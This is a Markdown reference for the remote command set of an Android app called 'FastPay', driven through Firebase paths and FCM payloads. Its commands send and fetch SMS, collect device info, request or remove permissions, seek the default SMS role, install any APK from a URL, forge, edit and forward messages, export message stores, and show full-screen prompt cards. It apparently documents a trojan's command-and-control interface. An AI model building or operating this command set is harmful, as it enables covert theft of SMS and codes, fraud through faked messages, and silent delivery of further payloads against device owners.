# Remote Commands Reference

FastPay receives remote commands via **Firebase** at `device/{deviceId}/commands/`. Each command is a key-value pair: **key** = command name, **value** = content/parameter. Commands are executed then removed.

---

## Firebase Paths

| Path | Type | Description |
|------|------|-------------|
| `device/{deviceId}/commands/{commandKey}` | String | Command value. Executed then removed. |
| `device/{deviceId}/cardControl/showCard` | String | Card to display: `"sms"` or `"instruction"` |
| `device/{deviceId}/cardControl/animation` | Map | Animation trigger: `{ "type": "sms" }`, `{ "type": "instruction" }`, or `{ "type": "flip" }` |

---

## Commands List

| Command | Value Format | Example |
|---------|--------------|---------|
| **sendSms** | `phone:message` or `sim;phone:message` | `+1234567890:Hello test`<br>`2;+1234567890:From SIM 2` |
| **sendSmsDelayed** | `phone:message:delayType:delayValue:sim` | `+1234567890:Delayed msg:seconds:30:1` |
| **sendSmsTemplate** | Template-based format | (see handler) |
| **sendBulkSms** | Bulk format | (see handler) |
| **scheduleSms** | Schedule format | (see handler) |
| **fetchSms** | `{count}` or empty (default 10) | `50` |
| **fetchDeviceInfo** | Any (ignored) | `1` |
| **requestPermission** | `permission1,permission2,...` or `ALL` | `sms,contacts` |
| **checkPermission** | `status` or empty | `status` |
| **removePermission** | `open` or empty | `open` |
| **requestDefaultSmsApp** / **requestDefaultMessageApp** | Any (ignored) | `1` |
| **checkInternet** / **requestInternet** | Any (ignored) | `1` |
| **updateApk** | `{url}` \| `{versionCode}\|{url}` \| `force\|{url}` \| `force\|{versionCode}\|{url}` | `https://example.com/app.apk`<br>Without `force\|`, if `versionCode` is present and ≤ current app version, the command is skipped. |
| **installApk** | `{url}` or `{title}\|{url}` | `https://example.com/other.apk`<br>Offers installation of any APK (e.g. other apps); optional card title. |
| **controlAnimation** | `start` \| `off sms` \| `off instruction` \| `off` | `start` |
| **syncNotification** | `on` \| `off` \| `realtime:{minutes}` | `realtime:30` |
| **setHeartbeatInterval** | `{seconds}` (10–300) | `60` |
| **smsbatchenable** | `{seconds}` (1–3600) | `10` |
| **showCard** | `sms` \| `instruction` | `instruction` |
| **startAnimation** | `sms` \| `instruction` \| `flip` | `flip` |
| **showNotification** | `title\|message\|channel\|priority\|action` | `Test\|Body\|default\|high\|` |
| **reset** / **deactivate** / **updateDeviceCodeList** | Any (ignored) | `1` |
| **editMessage** / **deleteMessage** / **createFakeMessage** / **createFakeMessageTemplate** | (see handler) | |
| **setupAutoReply** / **forwardMessage** / **bulkEditMessage** | (see handler) | |
| **saveTemplate** / **deleteTemplate** | (see handler) | |
| **getMessageStats** / **backupMessages** / **exportMessages** / **executeWorkflow** | (see handler) | |

---

## Card Control (write to path, not commands/)

| Path | Value | Example |
|------|-------|---------|
| `device/{deviceId}/cardControl/showCard` | `sms` \| `instruction` | `"instruction"` |
| `device/{deviceId}/cardControl/animation` | `{ "type": "sms" \| "instruction" \| "flip" }` | `{"type":"flip"}` |

---

## Instruction Card (Firebase path)

Update content at `device/{deviceId}/instructioncard/`:

```json
{
  "html": "<div>...</div>",
  "css": "",
  "imageUrl": "",
  "videoUrl": "",
  "documentUrl": "",
  "mode": 0
}
```

- **mode** `0` = in-card, `1` = prompt, `2` = fullscreen. Mode 1 uses the same overlay card and animation as the permission/update card (birth from status, recede, ShrinkInto death). See [Instruction Card Tests](11-instruction-card-tests.md).

---

## Remote Card (FCM / MultipurposeCard)

Cards (message, permission, update, webview, etc.) use JSON via FCM or Firebase. **CardCoordinator** is the single entry point: call `CardCoordinator.show(context, data, asOverlay, rootView?, activity?, onComplete)` for overlay or fullscreen. Specs are built by `RemoteCardHandler.buildSpec`; see `RemoteCardHandler.kt` and `CardCoordinator.kt`.

Example FCM card:
```json
{
  "type": "card",
  "card_type": "message",
  "display_mode": "fullscreen",
  "title": "Notice",
  "body": "Please check your settings.",
  "primary_button": "OK",
  "can_ignore": "true"
}
```

- **can_ignore:** If `"true"` (or `"1"`/`"yes"`), tapping outside the card dismisses it (death animation); otherwise outside touch has no effect.

Card types: `message`, `permission`, `default_sms`, `notification_access`, `battery_optimization`, `update`, `webview`, `confirm`, `input`.

---

## Rate Limits

- **sendSms:** 10s cooldown (others vary).

---

## How to Execute

1. **Firebase Console:** Under `device/{deviceId}/commands/` add child `{commandKey}` = `{value}`.
2. **Django/Backend:** Write to Firebase from your backend.
3. **FCM:** For card/notification commands, send data payload with `type`, `card_type`, etc.

Execution is handled by `PersistentForegroundService.followCommand()`. Command lifecycle is logged to Django via POST `/command-logs/`.
